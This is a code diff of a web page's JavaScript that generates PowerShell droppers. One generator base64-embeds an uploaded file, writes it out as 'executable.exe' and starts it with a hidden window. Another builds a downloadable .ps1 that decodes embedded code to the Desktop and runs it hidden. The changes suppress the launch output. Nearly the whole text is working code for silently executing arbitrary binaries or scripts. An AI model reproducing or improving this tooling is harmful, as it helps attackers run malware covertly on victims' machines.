@@ -156,7 +156,7 @@
             reader.onload = function(event) {
                 const base64String = event.target.result.split(',')[1];
                 finalPSCode = `
-                $b="${base64String}";[IO.File]::WriteAllBytes("executable.exe",[Convert]::FromBase64String($b));Start-Process -FilePath "executable.exe" -WindowStyle Hidden -NoNewWindow;
+                $b="${base64String}";[IO.File]::WriteAllBytes("executable.exe",[Convert]::FromBase64String($b));Start-Process -FilePath "executable.exe" -WindowStyle Hidden -NoNewWindow -PassThru | Out-Null;
                 `;
                 document.getElementById("ps-output").textContent = "PowerShell Code: " + finalPSCode.trim().substring(0, 50) + '...';
             };
@@ -182,8 +182,8 @@
             const psFileContent = `
             $code = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${encodedCode}'));
             Set-Content -Path "$([Environment]::GetFolderPath('Desktop'))\\script.ps1" -Value $code;
-            Start-Process -FilePath "$([Environment]::GetFolderPath('Desktop'))\\script.ps1" -WindowStyle Hidden -NoNewWindow;
-            `;
+            Start-Process -FilePath "$([Environment]::GetFolderPath('Desktop'))\\script.ps1" -WindowStyle Hidden -NoNewWindow -PassThru | Out-Null;
+            `.trim();
 
             const blob = new Blob([psFileContent], { type: 'application/octet-stream' });
             const link = document.createElement('a');
